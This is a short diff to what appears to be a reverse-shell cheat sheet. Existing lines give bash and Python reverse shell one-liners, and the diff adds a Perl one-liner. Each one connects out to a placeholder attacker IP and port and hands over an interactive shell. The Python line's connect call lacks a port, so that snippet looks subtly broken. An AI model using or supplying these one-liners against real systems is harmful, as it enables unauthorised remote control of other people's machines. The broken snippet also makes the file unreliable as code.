@@ -39,3 +39,6 @@ bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
 #Python (Replace IP Address)
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<IP_ADDRESS>")); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 
+#perl
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP_ADDRESS>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
